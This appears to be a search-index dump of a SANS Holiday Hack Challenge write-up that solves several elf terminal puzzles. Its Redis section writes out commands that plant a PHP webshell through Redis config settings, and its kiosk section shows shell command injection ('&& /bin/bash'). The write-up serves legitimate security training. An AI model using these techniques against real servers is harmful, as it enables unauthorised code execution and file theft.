could to it! I wonder, could we figure out the problem with the Tag Generator if we can get the source code? Can you figure out the path to the script? I've discovered that enumerating all endpoints is a really good idea to understand an application's functionality. Sometimes I find the Content-Type header hinders the browser more than it helps. If you find a way to execute code blindly, maybe you can redirect to a file then download that file?","title":"Holly Evergreen in Kitchen"},{"location":"elves/evergreen/#kitchen","text":"","title":"Kitchen"},{"location":"elves/evergreen/#holly-evergreen-redis-terminal","text":"Challenge Hi, so glad to see you! I'm Holly Evergreen. I've been working with this Redis-based terminal here. We're quite sure there's a bug in it, but we haven't caught it yet. The maintenance port is available for curling, if you'd like to investigate. Can you check the source of the index.php page and look for the bug? I read something online recently about remote code execution on Redis. That might help! I think I got close to RCE, but I get mixed up between commas and plusses. You'll figure it out, I'm sure! The \"Terminal\" for this elf challenge is a phone, and the right sequence of numbers and modem sounds must be hit. The challenge had a hint that links to the proper startup sound. Terminal Message We need your help!! The server stopped working, all that 's left is the maintenance port. To access it, run: curl http://localhost/maintenance.php We' re pretty sure the bug is in the index page. Can you somehow use the maintenance page to view the source code for the index page? Hint The hint on page on the Pentesting Redis Page demonstrated a technique for gaining RCE on a REDIS server. This YouTube video also helped. https://www.youtube.com/watch?v=LVlQmRM6DZ0 Playing with the commands, such as curling the maintenance page, I found this player@19977e41d642:~$ curl http://localhost/maintenance.php ERROR: 'cmd' argument required ( use commas to separate commands ) ; eg: curl http://localhost/maintenance.php?cmd = help curl http://localhost/maintenance.php?cmd = mget,example1 player@19977e41d642:~$ curl http://localhost/maintenance.php?cmd = help test Running: redis-cli --raw -a '<password censored>' 'help' redis-cli 5 .0.3 To get help about Redis commands type: \"help @<group>\" to get a list of commands in <group> \"help <command>\" for help on <command> \"help <tab>\" to get a list of possible help topics \"quit\" to exit To set redis-cli preferences: \":set hints\" enable online hints \":set nohints\" disable online hints Set your preferences in ~/.redisclirc curl: ( 6 ) Could not resolve host: test Leveraging the hints, here are the commands that would extract the contents of the index.php file. We are going to stuff a file_get_contents command inside a webshell.php and have that served by the Redis. Since we are submitting the command through URL parameters, we must encode the parameters. \"<?php echo file_get_contents('index.php'); ?>\" encodes to %22%3C%3Fphp%20echo%20file_get_contents%28%27index.php%27%29%3B%20%3F%3E%22 The commands are: curl http://localhost/maintenance.php?cmd = config,set,dir,/var/www/html curl http://localhost/maintenance.php?cmd = config,set,dbfilename,webshell.php curl http://localhost/maintenance.php?cmd = set,test,%22%3C%3Fphp%20echo%20file_get_contents%28%27index.php%27%29%3B%20%3F%3E%22 curl http://localhost/maintenance.php?cmd = save curl -o - http://localhost/webshell.php","title":"Holly Evergreen  - Redis Terminal"},{"location":"elves/evergreen/#alternative-approach","text":"The password to authenticate with redis is in plaintext in /etc/redis/redis.conf. requirepass \"R3disp@ss\" . I used a similar set of commands to perform the attack. redis-cli -a R3disp@ss config set dir /var/www/html redis-cli -a R3disp@ss config set dbfilename webshell.php redis-cli -a R3disp@ss set test \"<?php echo file_get_contents('index.php');?>\" redis-cli -a R3disp@ss save curl -o - http://localhost/webshell.php Success # We found the bug!! # # \\ / # .\\-/. # /\\ () () # \\/~---~\\.-~^-. # .-~^-./ | \\---. # { | } \\ # .-~\\ | /~-. # / \\ A / \\ # \\/ \\/ # Evergreen's Response See? I knew you could to it! I wonder, could we figure out the problem with the Tag Generator if we can get the source code? Can you figure out the path to the script? I've discovered that enumerating all endpoints is a really good idea to understand an application's functionality. Sometimes I find the Content-Type header hinders the browser more than it helps. If you find a way to execute code blindly, maybe you can redirect to a file then download that file?","title":"ALTERNATIVE APPROACH"},{"location":"elves/mary/","text":"Courtyard Sugarplum Mary - Linux Primer Challenge Sugarplum Mary? That's me! I was just playing with this here terminal and learning some Linux! It's a great intro to the Bash terminal. If you get stuck at any point, type hintme to get a nudge! Can you make it to the end? Hint type hintme to receive a hint. Terminal Message The North Pole \ud83c\udf6d Lollipop Maker: All the lollipops on this system have been stolen by munchkins. Capture munchkins by following instructions here and \ud83c\udf6d's will appear in the green bar below. Run the command \"hintme\" to receive a hint. This just required a long list of linux command with find, grep, ps, ln, ls, cp, mv, etc . No specific notes. Sugarplum Mary You did it - great! Maybe you can help me configure my postfix mail server on Gentoo! Just kidding! Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. I hear there's a way to extract an ASAR file from the binary, but I haven't looked into it yet.","title":"Sugarplum Mary in courtyard"},{"location":"elves/mary/#courtyard","text":"","title":"Courtyard"},{"location":"elves/mary/#sugarplum-mary-linux-primer","text":"Challenge Sugarplum Mary? That's me! I was just playing with this here terminal and learning some Linux! It's a great intro to the Bash terminal. If you get stuck at any point, type hintme to get a nudge! Can you make it to the end? Hint type hintme to receive a hint. Terminal Message The North Pole \ud83c\udf6d Lollipop Maker: All the lollipops on this system have been stolen by munchkins. Capture munchkins by following instructions here and \ud83c\udf6d's will appear in the green bar below. Run the command \"hintme\" to receive a hint. This just required a long list of linux command with find, grep, ps, ln, ls, cp, mv, etc . No specific notes. Sugarplum Mary You did it - great! Maybe you can help me configure my postfix mail server on Gentoo! Just kidding! Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. I hear there's a way to extract an ASAR file from the binary, but I haven't looked into it yet.","title":"Sugarplum Mary  - Linux Primer"},{"location":"elves/minstix/","text":"Castle Approach Pepper Minstix - Unescape Tmux Challenge Howdy - Pepper Minstix here! I've been playing with tmux lately, and golly it's useful. Problem is: I somehow became detached from my session. Do you think you could get me back to where I was, admiring a beautiful bird? If you find it handy, there's a tmux cheat sheet you can use as a reference. I hope you can help! Hint Everything is in the TMux Cheat Sheet Terminal Message Can you help me? I was playing with my birdie ( she ' s a Green Cheek! ) in something called tmux, then I did something and it disappeared! Can you help me find her? We were so attached!! elf@b17c39c2480a:~$ Answer elf@0007c4286995:~$ tmux attach-session Pepper Minstix's response You found her! Thanks so much for getting her back! Hey, maybe I can help YOU out! There's a Santavator that moves visitors from floor to floor, but it's a bit wonky. You'll need a key and other odd objects. Try talking to Sparkle Redberry about the key. For the odd objects, maybe just wander around the castle and see what you find on the floor. Once you have a few, try using them to split, redirect, and color the Super Santavator Sparkle Stream (S4). You need to power the red, yellow, and green receivers with the right color light!","title":"Pepper Minstix in Castle Approach"},{"location":"elves/minstix/#castle-approach","text":"","title":"Castle Approach"},{"location":"elves/minstix/#pepper-minstix-unescape-tmux","text":"Challenge Howdy - Pepper Minstix here! I've been playing with tmux lately, and golly it's useful. Problem is: I somehow became detached from my session. Do you think you could get me back to where I was, admiring a beautiful bird? If you find it handy, there's a tmux cheat sheet you can use as a reference. I hope you can help! Hint Everything is in the TMux Cheat Sheet Terminal Message Can you help me? I was playing with my birdie ( she ' s a Green Cheek! ) in something called tmux, then I did something and it disappeared! Can you help me find her? We were so attached!! elf@b17c39c2480a:~$ Answer elf@0007c4286995:~$ tmux attach-session Pepper Minstix's response You found her! Thanks so much for getting her back! Hey, maybe I can help YOU out! There's a Santavator that moves visitors from floor to floor, but it's a bit wonky. You'll need a key and other odd objects. Try talking to Sparkle Redberry about the key. For the odd objects, maybe just wander around the castle and see what you find on the floor. Once you have a few, try using them to split, redirect, and color the Super Santavator Sparkle Stream (S4). You need to power the red, yellow, and green receivers with the right color light!","title":"Pepper Minstix  - Unescape Tmux"},{"location":"elves/openslae/","text":"Netwars Noel Boetie - Sleigh Challenge Hey Santa! Those tweaks you made to the sled just don\u2019t seem right to me. I can\u2019t figure out what\u2019s wrong, but maybe you can check it out to fix it. Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints. The talk is CAN Bus Can-Can Notes Its a long set of logs, with three sets of numbers (1608926660.800530) vcan0 244#0000000116 First is the date/time. Third is the data. The data is broken up into: 244 - Can ID. Which is the task 0000000116 - Is the data chunk. So, we are looking for the locks (244), and different values for the data chunk. Since we are looking for a lock, unlock, lock again, we need to find a CAN ID that is only present three times. Lets use linux tools. cat candump.log | cut -d ' ' -f 3 | cut -d '#' -f1 | sort | uniq -c 35 188 3 19B 1331 244 My guess is that 19B is the lock, unlock. Lets print those out. elf@35fe7cc90c21:~$ grep \"19B#\" candump.log (1608926664.626448) vcan0 19B#000000000000 < Lock (1608926671.122520) vcan0 19B#00000F000000 < Unlock (1608926674.092148) vcan0 19B#000000000000 < lock Answer Answer is 122520 Wunorse Openslae Great work! You found the code! I wonder if I can use this knowledge to work out some kind of universal unlocker... ... to be used only with permission, of course!","title":"Wunorse Openslae in Netwars Room"},{"location":"elves/openslae/#netwars","text":"","title":"Netwars"},{"location":"elves/openslae/#noel-boetie-sleigh","text":"Challenge Hey Santa! Those tweaks you made to the sled just don\u2019t seem right to me. I can\u2019t figure out what\u2019s wrong, but maybe you can check it out to fix it. Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints. The talk is CAN Bus Can-Can","title":"Noel Boetie  - Sleigh"},{"location":"elves/openslae/#notes","text":"Its a long set of logs, with three sets of numbers (1608926660.800530) vcan0 244#0000000116 First is the date/time. Third is the data. The data is broken up into: 244 - Can ID. Which is the task 0000000116 - Is the data chunk. So, we are looking for the locks (244), and different values for the data chunk. Since we are looking for a lock, unlock, lock again, we need to find a CAN ID that is only present three times. Lets use linux tools. cat candump.log | cut -d ' ' -f 3 | cut -d '#' -f1 | sort | uniq -c 35 188 3 19B 1331 244 My guess is that 19B is the lock, unlock. Lets print those out. elf@35fe7cc90c21:~$ grep \"19B#\" candump.log (1608926664.626448) vcan0 19B#000000000000 < Lock (1608926671.122520) vcan0 19B#00000F000000 < Unlock (1608926674.092148) vcan0 19B#000000000000 < lock Answer Answer is 122520 Wunorse Openslae Great work! You found the code! I wonder if I can use this knowledge to work out some kind of universal unlocker... ... to be used only with permission, of course!","title":"Notes"},{"location":"elves/shortstack/","text":"Kitchen Fitz Shortstacks - 38.6 kbs Challenge \"Put it in the cloud,\" they said... \"It'll be great,\" they said... All the lights on the Christmas trees throughout the castle are controlled through a remote server. We can shuffle the colors of the lights by connecting via dial-up, but our only modem is broken! Fortunately, I speak dial-up. However, I can't quite remember the handshake sequence. Maybe you can help me out? The phone number is 756-8347; you can use this blue phone. The \"Terminal\" for this elf challenge is a phone, and the right sequence of numbers and modem sounds must be hit. The challenge had a hint that links to the proper startup sound. Clicking the text on the sticky note produces the proper dial-up, but with voice over it. Listening and trying the sequence would work. However, I pulled up the Developer Tools and looked at the JavaScript. Code for dialup.js Success happens by passing a secret value, and resourceId to checkpass.php . The secret variable is created by concatenating specific values once the code passes through each phase $ . get ( \"checkpass.php?i=\" + secret + \"&resourceId=\" + resourceId , function ( data ) { try { var result = JSON . parse ( data ); if ( result . success ) { __POST_RESULTS__ ({ hash : result . hash , resourceId : result . resourceId , }); } } catch ( err ) { console . log ( 'error:' , err ); } After looking through the code, I was able to pull out the secret value assigned at each phase, and the button that has to be pressed to move to the next stage. You start at Phase 0. To progress to the next phase in the code, you must do the following: Answer Phase Secret Action 1 39cajd Pick Up Handset 2 Dial the first number 3 Dial 7568347 in the right order 4 3j2jc Dial 7568347 in the right order 5 329dz click baaDEEbrrr 6 4hhdd click aaah 7 hbvan3 click wewewwwrwrrwrr 8 djjzz click beDURRdunditty then SCHHRRHHRTHRTR Shortstack's Response Anytime you feel like changing the color scheme up, just pick up the phone! You know, Santa really seems to trust Shinny Upatree...","title":"Fitz ShortStack in Kitchen"},{"location":"elves/shortstack/#kitchen","text":"","title":"Kitchen"},{"location":"elves/shortstack/#fitz-shortstacks-386-kbs","text":"Challenge \"Put it in the cloud,\" they said... \"It'll be great,\" they said... All the lights on the Christmas trees throughout the castle are controlled through a remote server. We can shuffle the colors of the lights by connecting via dial-up, but our only modem is broken! Fortunately, I speak dial-up. However, I can't quite remember the handshake sequence. Maybe you can help me out? The phone number is 756-8347; you can use this blue phone. The \"Terminal\" for this elf challenge is a phone, and the right sequence of numbers and modem sounds must be hit. The challenge had a hint that links to the proper startup sound. Clicking the text on the sticky note produces the proper dial-up, but with voice over it. Listening and trying the sequence would work. However, I pulled up the Developer Tools and looked at the JavaScript. Code for dialup.js Success happens by passing a secret value, and resourceId to checkpass.php . The secret variable is created by concatenating specific values once the code passes through each phase $ . get ( \"checkpass.php?i=\" + secret + \"&resourceId=\" + resourceId , function ( data ) { try { var result = JSON . parse ( data ); if ( result . success ) { __POST_RESULTS__ ({ hash : result . hash , resourceId : result . resourceId , }); } } catch ( err ) { console . log ( 'error:' , err ); } After looking through the code, I was able to pull out the secret value assigned at each phase, and the button that has to be pressed to move to the next stage. You start at Phase 0. To progress to the next phase in the code, you must do the following: Answer Phase Secret Action 1 39cajd Pick Up Handset 2 Dial the first number 3 Dial 7568347 in the right order 4 3j2jc Dial 7568347 in the right order 5 329dz click baaDEEbrrr 6 4hhdd click aaah 7 hbvan3 click wewewwwrwrrwrr 8 djjzz click beDURRdunditty then SCHHRRHHRTHRTR Shortstack's Response Anytime you feel like changing the color scheme up, just pick up the phone! You know, Santa really seems to trust Shinny Upatree...","title":"Fitz Shortstacks  - 38.6 kbs"},{"location":"elves/snowball/","text":"Netwars Alabaster Snowball - Scapy Prepper Challenge Hey Santa! You've got to check out our Scapy Present Packet Prepper! Please work through the whole thing to make sure it's helpful for our guests! I made it so that players can help() to see how to get tasks and hints. When you're done, maybe you can help me with this other issue I'm having. In this challege, a set of coding challenges are presented Q 1 Start by running the task.submit () function passing in a string argument of 'start' . Type task.help () for help on this question. >>> task.submit ( \"start\" ) Q2 Submit the class object of the scapy module that sends packets at layer 3 of the OSI model. >>> task.submit ( send ) Correct! The \"send\" scapy class will send a crafted scapy packet out of a network interface. Q3 Submit the class object of the scapy module that sniffs network packets and returns those packets in a list. >>> task.submit ( sniff ) Correct! the \"sniff\" scapy class will sniff network traffic and return these packets in a list. Q4 Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named \"pkt\" : 1 . pkt = sr1 ( IP ( dst = \"127.0.0.1\" ) /TCP ( dport = 20 )) 2 . pkt = sniff ( IP ( dst = \"127.0.0.1\" ) /TCP ( dport = 20 )) 3 . pkt = sendp ( IP ( dst = \"127.0.0.1\" ) /TCP ( dport = 20 )) >>> task.submit ( 1 ) Correct! sr1 will send a packet, then immediately sniff for a response packet. Q5 Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets. >>> task.submit ( rdpcap ) Correct! the \"rdpcap\" scapy class can read pcap files. The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices b elow that correctly prints a summary of UDP_PACKETS: 1 . UDP_PACKETS.print () 2 . UDP_PACKETS.show () 3 . UDP_PACKETS.list () >>> task.submit ( 2 ) Correct! .show () can be used on lists of packets AND on an individual packet. Q6 Submit only the first packet found in UDP_PACKETS. >>> task.submit ( UDP_PACKETS [ 0 ]) Correct! Scapy packet lists work just like regular python lists so packets can be accessed by their position in the list starting at offset 0 . Q7 Submit only the entire TCP layer of the second packet in TCP_PACKETS. >>> task.submit ( TCP_PACKETS [ 1 ][ TCP ]) Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, etc... c an be accessed this way. Ex - pkt [ IP ][ TCP ] Q8 Change the source IP address of the first packet found in UDP_PACKETS to 127 .0.0.1 and then submit this modified packet >>> UDP_PACKETS [ 0 ][ IP ] .src = '127.0.0.1' >>> task.submit ( UDP_PACKETS [ 0 ]) Correct! You can change ALL scapy packet attributes using this method. Q9 Submit the password \"task.submit('elf_password')\" of the user alabaster as found in the packet list TCP_PACKETS. >>> TCP_PACKETS [ 6 ] .show () ###[ Ethernet ]### dst = 00 :15:f2:40:76:ef src = 00 :16:ce:6e:8b:24 type = IPv4 ###[ IP ]### version = 4 ihl = 5 tos = 0x0 len = 51 id = 42982 flags = DF frag = 0 ttl = 128 proto = tcp chksum = 0xd05a src = 192 .168.0.114 dst = 192 .168.0.193 \\o ptions \\ ###[ TCP ]### sport = 1137 dport = ftp seq = 3753095950 ack = 3334930821 dataofs = 5 reserved = 0 flags = PA window = 17357 chksum = 0xe96b urgptr = 0 options = [] ###[ Raw ]### load = 'PASS echo\\r\\n' >>> task.submit ( 'echo' ) Correct! Here is some really nice list comprehension that will grab all the raw payloads from tcp packets: [ pkt [ Raw ] .load for pkt in TCP_PACKETS if Raw in pkt ] Q10 The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list. >>> task.submit ( ICMP_PACKETS [ 1 ][ ICMP ] .chksum ) Correct! You can access the ICMP chksum value from the second packet using ICMP_PACKETS [ 1 ][ ICMP ] .c hksum . Q11 Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127 .0.0.1 stored in the variable named \"pkt\" 1 . pkt = Ether ( src = '127.0.0.1' ) /ICMP ( type = \"echo-request\" ) 2 . pkt = IP ( src = '127.0.0.1' ) /ICMP ( type = \"echo-reply\" ) 3 . pkt = IP ( dst = '127.0.0.1' ) /ICMP ( type = \"echo-request\" ) >>> task.submit ( 3 ) Correct! Once you assign the packet to a variable named \"pkt\" you can then use that variable to send or manipulate your created packet. Q12 Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127 .127.127.127. ( all other packet attributes can be unspecified ) >>> p = IP ( dst = '127.127.127.127' ) /UDP ( dport = 5000 ) >>> task.submit ( p ) Correct! Your UDP packet creation should look something like this: pkt = IP ( dst = \"127.127.127.127\" ) /UDP ( dport = 5000 ) task.submit ( pkt ) Q13 Create and then submit a UDP packet with a dport of 53 , a dst IP of 127 .2.3.4, and is a DNS query with a qname of \"elveslove.santa\" . ( all other packet attributes can be unspecified ) >>> p = IP ( dst = '127.2.3.4' ) /UDP ( dport = 53 ) /DNS ( qd = DNSQR ( qname = 'elveslove.santa' )) >>> task.submit ( p ) Correct! Your UDP packet creation should look something like this: pkt = IP ( dst = \"127.2.3.4\" ) /UDP ( dport = 53 ) /DNS ( rd = 1 ,qd = DNSQR ( qname = \"elveslove.santa\" )) task.submit ( pkt ) Q14 The variable ARP_PACKETS contains an ARP request and response packets. The ARP response ( the second packet ) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit ( ARP_PACKETS ) for inspection. >>> ARP_PACKETS [ 1 ] .show () ###[ Ethernet ]### dst = 00 :16:ce:6e:8b:24 src = 00 :13:46:0b:22:ba type = ARP ###[ ARP ]### hwtype = 0x1 ptype = IPv4 hwlen = 6 plen = 4 op = None < - reply hwsrc = ff:ff:ff:ff:ff:ff < 00 :13:46:0b:22:ba psrc = 192 .168.0.1 hwdst = ff:ff:ff:ff:ff:ff < 00 :16:ce:6e:8b:24 pdst = 192 .168.0.114 ###[ Padding ]### load = '\\xc0\\xa8\\x00r' >>> ARP_PACKETS [ 1 ][ ARP ] .op = 2 >>> ARP_PACKETS [ 1 ][ ARP ] .hwsrc = '00:13:46:0b:22:ba' >>> ARP_PACKETS [ 1 ][ ARP ] .hwdst = '00:16:ce:6e:8b:24' >>> task.submit ( ARP_PACKETS ) Great, you prepared all the present packets! Congratulations, all pretty present packets properly prepared for processing! Alabaster's Response Oh, I see the Scapy Present Packet Prepper has already been completed! Now you can help me get access to this machine. It seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we'll still need to cook up something to change the HTTP response. I'm sure glad you're here Santa.","title":"Alabaster Snowball in Netwars Room"},{"location":"elves/snowball/#netwars","text":"","title":"Netwars"},{"location":"elves/snowball/#alabaster-snowball-scapy-prepper","text":"Challenge Hey Santa! You've got to check out our Scapy Present Packet Prepper! Please work through the whole thing to make sure it's helpful for our guests! I made it so that players can help() to see how to get tasks and hints. When you're done, maybe you can help me with this other issue I'm having. In this challege, a set of coding challenges are presented","title":"Alabaster Snowball - Scapy Prepper"},{"location":"elves/snowball/#q-1","text":"Start by running the task.submit () function passing in a string argument of 'start' . Type task.help () for help on this question. >>> task.submit ( \"start\" )","title":"Q 1"},{"location":"elves/snowball/#q2","text":"Submit the class object of the scapy module that sends packets at layer 3 of the OSI model. >>> task.submit ( send ) Correct! The \"send\" scapy class will send a crafted scapy packet out of a network interface.","title":"Q2"},{"location":"elves/snowball/#q3","text":"Submit the class object of the scapy module that sniffs network packets and returns those packets in a list. >>> task.submit ( sniff ) Correct! the \"sniff\" scapy class will sniff network traffic and return these packets in a list.","title":"Q3"},{"location":"elves/snowball/#q4","text":"Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named \"pkt\" : 1 . pkt = sr1 ( IP ( dst = \"127.0.0.1\" ) /TCP ( dport = 20 )) 2 . pkt = sniff ( IP ( dst = \"127.0.0.1\" ) /TCP ( dport = 20 )) 3 . pkt = sendp ( IP ( dst = \"127.0.0.1\" ) /TCP ( dport = 20 )) >>> task.submit ( 1 ) Correct! sr1 will send a packet, then immediately sniff for a response packet.","title":"Q4"},{"location":"elves/snowball/#q5","text":"Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets. >>> task.submit ( rdpcap ) Correct! the \"rdpcap\" scapy class can read pcap files. The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices b elow that correctly prints a summary of UDP_PACKETS: 1 . UDP_PACKETS.print () 2 . UDP_PACKETS.show () 3 . UDP_PACKETS.list () >>> task.submit ( 2 ) Correct! .show () can be used on lists of packets AND on an individual packet.","title":"Q5"},{"location":"elves/snowball/#q6","text":"Submit only the first packet found in UDP_PACKETS. >>> task.submit ( UDP_PACKETS [ 0 ]) Correct! Scapy packet lists work just like regular python lists so packets can be accessed by their position in the list starting at offset 0 .","title":"Q6"},{"location":"elves/snowball/#q7","text":"Submit only the entire TCP layer of the second packet in TCP_PACKETS. >>> task.submit ( TCP_PACKETS [ 1 ][ TCP ]) Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, etc... c an be accessed this way. Ex - pkt [ IP ][ TCP ]","title":"Q7"},{"location":"elves/snowball/#q8","text":"Change the source IP address of the first packet found in UDP_PACKETS to 127 .0.0.1 and then submit this modified packet >>> UDP_PACKETS [ 0 ][ IP ] .src = '127.0.0.1' >>> task.submit ( UDP_PACKETS [ 0 ]) Correct! You can change ALL scapy packet attributes using this method.","title":"Q8"},{"location":"elves/snowball/#q9","text":"Submit the password \"task.submit('elf_password')\" of the user alabaster as found in the packet list TCP_PACKETS. >>> TCP_PACKETS [ 6 ] .show () ###[ Ethernet ]### dst = 00 :15:f2:40:76:ef src = 00 :16:ce:6e:8b:24 type = IPv4 ###[ IP ]### version = 4 ihl = 5 tos = 0x0 len = 51 id = 42982 flags = DF frag = 0 ttl = 128 proto = tcp chksum = 0xd05a src = 192 .168.0.114 dst = 192 .168.0.193 \\o ptions \\ ###[ TCP ]### sport = 1137 dport = ftp seq = 3753095950 ack = 3334930821 dataofs = 5 reserved = 0 flags = PA window = 17357 chksum = 0xe96b urgptr = 0 options = [] ###[ Raw ]### load = 'PASS echo\\r\\n' >>> task.submit ( 'echo' ) Correct! Here is some really nice list comprehension that will grab all the raw payloads from tcp packets: [ pkt [ Raw ] .load for pkt in TCP_PACKETS if Raw in pkt ]","title":"Q9"},{"location":"elves/snowball/#q10","text":"The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list. >>> task.submit ( ICMP_PACKETS [ 1 ][ ICMP ] .chksum ) Correct! You can access the ICMP chksum value from the second packet using ICMP_PACKETS [ 1 ][ ICMP ] .c hksum .","title":"Q10"},{"location":"elves/snowball/#q11","text":"Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127 .0.0.1 stored in the variable named \"pkt\" 1 . pkt = Ether ( src = '127.0.0.1' ) /ICMP ( type = \"echo-request\" ) 2 . pkt = IP ( src = '127.0.0.1' ) /ICMP ( type = \"echo-reply\" ) 3 . pkt = IP ( dst = '127.0.0.1' ) /ICMP ( type = \"echo-request\" ) >>> task.submit ( 3 ) Correct! Once you assign the packet to a variable named \"pkt\" you can then use that variable to send or manipulate your created packet.","title":"Q11"},{"location":"elves/snowball/#q12","text":"Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127 .127.127.127. ( all other packet attributes can be unspecified ) >>> p = IP ( dst = '127.127.127.127' ) /UDP ( dport = 5000 ) >>> task.submit ( p ) Correct! Your UDP packet creation should look something like this: pkt = IP ( dst = \"127.127.127.127\" ) /UDP ( dport = 5000 ) task.submit ( pkt )","title":"Q12"},{"location":"elves/snowball/#q13","text":"Create and then submit a UDP packet with a dport of 53 , a dst IP of 127 .2.3.4, and is a DNS query with a qname of \"elveslove.santa\" . ( all other packet attributes can be unspecified ) >>> p = IP ( dst = '127.2.3.4' ) /UDP ( dport = 53 ) /DNS ( qd = DNSQR ( qname = 'elveslove.santa' )) >>> task.submit ( p ) Correct! Your UDP packet creation should look something like this: pkt = IP ( dst = \"127.2.3.4\" ) /UDP ( dport = 53 ) /DNS ( rd = 1 ,qd = DNSQR ( qname = \"elveslove.santa\" )) task.submit ( pkt )","title":"Q13"},{"location":"elves/snowball/#q14","text":"The variable ARP_PACKETS contains an ARP request and response packets. The ARP response ( the second packet ) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit ( ARP_PACKETS ) for inspection. >>> ARP_PACKETS [ 1 ] .show () ###[ Ethernet ]### dst = 00 :16:ce:6e:8b:24 src = 00 :13:46:0b:22:ba type = ARP ###[ ARP ]### hwtype = 0x1 ptype = IPv4 hwlen = 6 plen = 4 op = None < - reply hwsrc = ff:ff:ff:ff:ff:ff < 00 :13:46:0b:22:ba psrc = 192 .168.0.1 hwdst = ff:ff:ff:ff:ff:ff < 00 :16:ce:6e:8b:24 pdst = 192 .168.0.114 ###[ Padding ]### load = '\\xc0\\xa8\\x00r' >>> ARP_PACKETS [ 1 ][ ARP ] .op = 2 >>> ARP_PACKETS [ 1 ][ ARP ] .hwsrc = '00:13:46:0b:22:ba' >>> ARP_PACKETS [ 1 ][ ARP ] .hwdst = '00:16:ce:6e:8b:24' >>> task.submit ( ARP_PACKETS ) Great, you prepared all the present packets! Congratulations, all pretty present packets properly prepared for processing! Alabaster's Response Oh, I see the Scapy Present Packet Prepper has already been completed! Now you can help me get access to this machine. It seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we'll still need to cook up something to change the HTTP response. I'm sure glad you're here Santa.","title":"Q14"},{"location":"elves/upatree/","text":"Castle Approach Shiny Upatree - Kringle Kiosk Challenge Hiya hiya - I'm Shinny Upatree! Check out this cool KringleCon kiosk! You can get a map of the castle, learn about where the elves are, and get your own badge printed right on-screen! Be careful with that last one though. I heard someone say it's \"ingestible.\" Or something... Do you think you could check and see if there is an issue? Hint In the hint, there is a link to command injection techniques from OWASP The terminal has a set of commands. The hint pointed at the 4 th one, which is a problem. ```bash ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Welcome to the North Pole! ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 1. Map 2. Code of Conduct and Terms of Use 3. Directory 4. Print Name Badge 5. Exit Please select an item from the menu by entering a single number. Anything else might have ... unintended consequences. Enter choice [1 - 5] ``` Choice 1 in the Terminal - Map Choice 3 in the Terminal - Directory Choice 4 in the Terminal - Printing In this command, you print out a command. I ented \">\" and got this message ```bash Enter your name (Please avoid special characters, they cause some weird errors)...> bash: -c: line 0: syntax error near unexpected token `newline' bash: -c: line 0: `/usr/games/cowsay -f /opt/reindeer.cow >' ``` The program will also cause \"Error\" if you enter an invalid number I believe I have to enter a newline and then run a command. I found that I could enter (4), to enter a name. And, I could append a command to be executed by entering a name like hacked && echo hacked I had forgotten the intension of the terminal, so I used hacked && echo welcome.sh to get the entire shell script as shown welcome.sh Success I found that the goal was to escape the menu, so I ran hacked && /bin/bash ________ < hacked > -------- \\ \\ \\_\\_ _/_/ \\ \\_ _/ ( oo ) \\_ ______ ( __ ) \\ ) \\/\\ || ----w | || || ___ _ / __ | _ _ __ __ ___ ___ ___ | | \\_ _ \\ | + | | / _ | / _ | / -_ ) ( _-< ( _-< | _ | | ___/ \\_ ,_ | \\_ _ | _ \\_ _ | _ \\_ __ | /__/_ /__/_ _ ( _ ) _ _ | \"\"\"\"\"|_|\"\"\"\"\" | _ | \"\"\"\"\"|_|\"\"\"\"\" | _ | \"\"\"\"\"|_|\"\"\"\"\" | _ | \"\"\"\"\"|_| \"\"\" | \"`-0-0-'\" ` -0-0- '\"`-0-0-' \"`-0-0-'\" ` -0-0- '\"`-0-0-' \"`-0-0-'\" ` -0-0- ' Shinny's Response Golly - wow! You sure found the flaw for us! Say, we've been having an issue with an Amazon S3 bucket. Do you think you could help find Santa's package file? Jeepers, it seems there's always a leaky bucket in the news. You'd think we could find our own files! Digininja has a great guide, if you're new to S3 searching. He even released a tool for the task - what a guy! The package wrapper Santa used is reversible, but it may take you some trying. Good luck, and thanks for pitching in! Jason is HERE Hitting the nail on the scaffolding gives a message: Job Hunting? Feeling Stuck? Join me for an interactive job hunting livestream! Any industry. Any type of job. No vendor pitches. Not selling anything. Just helping. Jason is in the Matrix On this terminal, in the /opt directory, there is a file called plant.txt . The contents say: Hi, my name is Jason the Plant! ( U \\| ) 